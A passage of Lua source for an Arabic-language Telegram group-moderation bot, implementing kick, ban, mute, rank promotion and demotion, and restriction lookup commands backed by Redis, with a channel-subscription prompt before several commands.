elseif Remsg.content.photo then
redis:srem(bot_id.."mn:content:Photo"..msg.chat_id,Remsg.content.photo.sizes[1].photo.remote.unique_id)  
ty = "الصوره"
end
bot.sendText(msg.chat_id,msg.id,"*• تم الغاء منع "..ty.." *","md",true)  
end
----------------------------------------------------------------------------------------------------
end
----------------------------------------------------------------------------------------------------
if msg and msg.content.text and msg.content.text.entities[1] and (msg.content.text.entities[1].luatele == "textEntity") and (msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName") then
if text and text:match('^كشف (.*)$') or text and text:match('^ايدي (.*)$') then
local UserName = text:match('^كشف (.*)$') or text:match('^ايدي (.*)$')
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
sm = bot.getChatMember(msg.chat_id,usetid)
if sm.status.luatele == "chatMemberStatusCreator"  then
gstatus = "المالك الاساسي"
elseif sm.status.luatele == "chatMemberStatusAdministrator" then
gstatus = "المشرف"
else
gstatus = "عضو"
end
bot.sendText(msg.chat_id,msg.id,"*iD ↦ *`"..(usetid).."` **\n*Rank ↦ *`"..(Get_Rank(usetid,msg.chat_id)).."` **\n*RanGr ↦ *`"..(gstatus).."` **\n*Msg ↦ *`"..(redis:get(bot_id..":"..msg.chat_id..":"..usetid..":message") or 1).."` **" ,"md",true)  
end
end
if Administrator(msg)  then
if text and text:match('^طرد (.*)$') then
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:kik") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• الطرد معطل من قبل المنشئين الاساسيين*").yu,"md",true)
return false
end
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*• البوت لا يمتلك صلاحيه طرد الاعضاء* ',"md",true)  
return false
end
if not Norank(usetid,msg.chat_id) then
t = "*↯︙عذرا لايمكن  اطرد "..Get_Rank(usetid,msg.chat_id).."*"
else
t = "*↯︙تم طردته*"
bot.setChatMemberStatus(msg.chat_id,usetid,'banned',0)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,t).helo,"md",true)    
end
end
if text and text:match("^تنزيل (.*) (.*)") and tonumber(msg.reply_to_message_id) == 0 then
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
local infotxt = {text:match("^تنزيل (.*) (.*)")}
TextMsg = infotxt[1]
if msg.content.text then 
if TextMsg == 'مطور ثانوي' then
srt = "programmer"
srt1 = ":"
elseif TextMsg == 'مطور' then
srt = "developer"
srt1 = ":"
elseif TextMsg == 'مالك' then
srt = "Creator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ اساسي' then
srt = "BasicConstructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ' then
srt = "Constructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مدير' then
srt = "Owner"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'ادمن' then
srt = "Administrator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مميز' then
srt = "Vips"
srt1 = ":"..msg.chat_id..":"
else
return false
end  
if not redis:sismember(bot_id..srt1.."Status:"..srt,usetid) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,"*↯︙لم يتم رفعه  "..TextMsg.." من قبل*").helo,"md",true)  
return false
end
if devB(msg.sender.user_id) then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif programmer(msg) then
if TextMsg == 'مطور' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مالك' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end
elseif developer(msg) then
if TextMsg == 'مالك' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Creator(msg) then
if TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif BasicConstructor(msg) then
if TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Constructor(msg) then
if TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Owner(msg) then
if TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Administrator(msg) then
if TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Vips(msg) then
return false
else
return false
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,"*↯︙تم تنزيله من الرتبه التاليه  "..TextMsg.." *").helo,"md",true)  
return false
end
end
end
if text and text:match("^رفع (.*) (.*)") and tonumber(msg.reply_to_message_id) == 0 then
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
local infotxt = {text:match("^رفع (.*) (.*)")}
TextMsg = infotxt[1]
if msg.content.text then 
if TextMsg == 'مطور ثانوي' then
srt = "programmer"
srt1 = ":"
elseif TextMsg == 'مطور' then
srt = "developer"
srt1 = ":"
elseif TextMsg == 'مالك' then
srt = "Creator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ اساسي' then
srt = "BasicConstructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ' then
srt = "Constructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مدير' then
srt = "Owner"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'ادمن' then
srt = "Administrator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مميز' then
srt = "Vips"
srt1 = ":"..msg.chat_id..":"
else
return false
end  
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:Up") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• الرفع معطل من قبل المنشئين الاساسيين*").yu,"md",true)  
return false
end
end
if redis:sismember(bot_id..srt1.."Status:"..srt,usetid) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,"* ↯︙تم ترقيته "..TextMsg.." من قبل*").helo,"md",true)  
return false
end
if devB(msg.sender.user_id) then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif programmer(msg) then
if TextMsg == 'مطور' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end
elseif developer(msg) then
if TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Creator(msg) then
if TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif BasicConstructor(msg) then
if TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Constructor(msg) then
if TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Owner(msg) then
if TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Administrator(msg) then
if TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Vips(msg) then
return false
else
return false
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,"*↯︙ تم ترقيته "..TextMsg.."بنجاح*").helo,"md",true)  
return false
end
end
end
if text and text:match("^تنزيل الكل (.*)") and tonumber(msg.reply_to_message_id) == 0 then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if Get_Rank(usetid,msg.chat_id)== "عضو" then
tt = "↯︙ماله رتبة"
else
tt = "↯︙تم تنزيله من جميع الرتب "
end
if devB(msg.sender.user_id) then
redis:srem(bot_id..":Status:programmer",usetid)
redis:srem(bot_id..":Status:developer",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",usetid)
elseif programmer(msg) then
redis:srem(bot_id..":Status:developer",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",usetid)
elseif developer(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Creator",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",usetid)
elseif Creator(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",usetid)
elseif BasicConstructor(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",usetid)
elseif Constructor(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",usetid)
elseif Owner(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",usetid)
elseif Administrator(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",usetid)
elseif Vips(msg) then
return false
else
return false
end
if bot.getChatMember(msg.chat_id,usetid).status.luatele == "chatMemberStatusCreator" then
redis:sadd(bot_id..":"..msg.chat_id..":Status:Creator",usetid)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,"*"..tt.."*").helo,"md",true)  
return false
end
end
if text and text:match('^الغاء كتم (.*)$') or text and text:match('^الغاء الكتم (.*)$') then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
t = "*↯︙تم الغاء  كتمه *"
redis:srem(bot_id..":"..msg.chat_id..":silent",usetid)
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,t).helo,"md",true)  
end
end
if text and text:match('^كتم (.*)$') then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:ktm") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• الكتم معطل من قبل المنشئين الاساسيين*").yu,"md",true)  
return false
end
end
if not Norank(usetid,msg.chat_id) then
t = "*↯︙عذرا لايمكن  اكتم "..Get_Rank(usetid,msg.chat_id).."*"
else
t = "*↯︙تم كتمه في المجموعة*"
redis:sadd(bot_id..":"..msg.chat_id..":silent",usetid)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,t).helo,"md",true)    
end
end
if text and text:match('^الغاء حظر (.*)$') then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
t = "*↯︙تم الغاء  حظره *"
redis:srem(bot_id..":"..msg.chat_id..":Ban",usetid)
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,t).helo,"md",true)    
bot.setChatMemberStatus(msg.chat_id,usetid,'restricted',{1,1,1,1,1,1,1,1,1})
end
end
if text and text:match('^حظر (.*)$') then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:bn") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• الحظر معطل من قبل المنشئين الاساسيين*").yu,"md",true)  
return false
end
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*• البوت لا يمتلك صلاحيه حظر الاعضاء* ',"md",true)  
return false
end
if not Norank(usetid,msg.chat_id) then
t = "*↯︙عذرا لايمكن  احظر "..Get_Rank(usetid,msg.chat_id).."*"
else
t = "*↯︙تم حظرة*"
bot.setChatMemberStatus(msg.chat_id,usetid,'banned',0)
redis:sadd(bot_id..":"..msg.chat_id..":Ban",usetid)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,t).helo,"md",true)    
end
end
end
end
----------------------------------------------------------------------------------------------------
if Administrator(msg)  then
----------------------------------------------------------------------------------------------------
if text and text:match('^رفع القيود @(%S+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^رفع القيود @(%S+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
if redis:sismember(bot_id..":"..msg.chat_id..":restrict", UserId_Info.id) then
redis:srem(bot_id..":"..msg.chat_id..":restrict",UserId_Info.id)
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if redis:sismember(bot_id..":"..msg.chat_id..":silent", UserId_Info.id) then
redis:srem(bot_id..":"..msg.chat_id..":silent",UserId_Info.id)
end
if redis:sismember(bot_id..":"..msg.chat_id..":Ban", UserId_Info.id) then
redis:srem(bot_id..":"..msg.chat_id..":Ban",UserId_Info.id)
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,"*↯︙تم رفعت القيود عنه*").helo,"md",true)  
return false
end
if text and text:match('^رفع القيود (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^رفع القيود (%d+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if redis:sismember(bot_id..":"..msg.chat_id..":restrict", UserName) then
redis:srem(bot_id..":"..msg.chat_id..":restrict",UserName)
bot.setChatMemberStatus(msg.chat_id,UserName,'restricted',{1,1,1,1,1,1,1,1,1})
end
if redis:sismember(bot_id..":"..msg.chat_id..":silent", UserName) then
redis:srem(bot_id..":"..msg.chat_id..":silent",UserName)
end
if redis:sismember(bot_id..":"..msg.chat_id..":Ban", UserName) then
redis:srem(bot_id..":"..msg.chat_id..":Ban",UserName)
bot.setChatMemberStatus(msg.chat_id,UserName,'restricted',{1,1,1,1,1,1,1,1,1})
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,"*↯︙تم رفعت القيود عنه*").helo,"md",true)  
return false
end
if text == "رفع القيود" and msg.reply_to_message_id ~= 0 then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if redis:sismember(bot_id..":"..msg.chat_id..":restrict", Remsg.sender.user_id) then
redis:srem(bot_id..":"..msg.chat_id..":restrict",Remsg.sender.user_id)
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if redis:sismember(bot_id..":"..msg.chat_id..":silent", Remsg.sender.user_id) then
redis:srem(bot_id..":"..msg.chat_id..":silent",Remsg.sender.user_id)
end
if redis:sismember(bot_id..":"..msg.chat_id..":Ban", Remsg.sender.user_id) then
redis:srem(bot_id..":"..msg.chat_id..":Ban",Remsg.sender.user_id)
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,"*↯︙تم رفعت القيود عنه*").helo,"md",true)  
return false
end
if text and text:match('^كشف القيود @(%S+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^كشف القيود @(%S+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
if redis:sismember(bot_id..":bot:Ban", UserId_Info.id) then
Banal = "• الحظر العام : ✔️"
else
Banal = "• الحظر العام : ❌"
end
if redis:sismember(bot_id..":bot:silent", UserId_Info.id) then
silental  = "• الكتم العام : ✔️"
else
silental = "• الكتم العام : ❌"
end
if redis:sismember(bot_id..":"..msg.chat_id..":restrict", UserId_Info.id) then
rict = "• التقييد : ✔️"
else
rict = "• التقييد : ❌"
end
if redis:sismember(bot_id..":"..msg.chat_id..":silent", UserId_Info.id) then
sent = "\n• الكتم : ✔️"
else
sent = "\n• الكتم : ❌"
end
if redis:sismember(bot_id..":"..msg.chat_id..":Ban", UserId_Info.id) then
an = "\n• الحظر : ✔️"
else
an = "\n• الحظر : ❌"
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id," *━━━━━━━━━━━\n"..Banal.."\n"..silental.."\n"..rict..""..sent..""..an.."*").helo,"md",true)  
return false
end
if text and text:match('^كشف القيود (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^كشف القيود (%d+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if redis:sismember(bot_id..":bot:Ban", UserName) then
Banal = "• الحظر العام : ✔️"
else
Banal = "• الحظر العام : ❌"
end
if redis:sismember(bot_id..":bot:silent", UserName) then
silental  = "• الكتم العام : ✔️"
else
silental = "• الكتم العام : ❌"
end
if redis:sismember(bot_id..":"..msg.chat_id..":restrict", UserName) then
rict = "• التقييد : ✔️"
else
rict = "• التقييد : ❌"
end
if redis:sismember(bot_id..":"..msg.chat_id..":silent", UserName) then
sent = "\n• الكتم : ✔️"
else
sent = "\n• الكتم : ❌"
end
if redis:sismember(bot_id..":"..msg.chat_id..":Ban", UserName) then
an = "\n• الحظر : ✔️"
else
an = "\n• الحظر : ❌"
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,"*━━━━━━━━━━━\n"..Banal.."\n"..silental.."\n"..rict..""..sent..""..an.."*").helo,"md",true)  
return false
end
if text == "كشف القيود" and msg.reply_to_message_id ~= 0 then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if redis:sismember(bot_id..":bot:Ban", Remsg.sender.user_id) then
Banal = "• الحظر العام : ✔️"
else
Banal = "• الحظر العام : ❌"
end
if redis:sismember(bot_id..":bot:silent", Remsg.sender.user_id) then
silental  = "• الكتم العام : ✔️"
else
silental = "• الكتم العام : ❌"
end
if redis:sismember(bot_id..":"..msg.chat_id..":restrict", Remsg.sender.user_id) then
rict = "• التقييد : ✔️"
else
rict = "• التقييد : ❌"
end
if redis:sismember(bot_id..":"..msg.chat_id..":silent", Remsg.sender.user_id) then
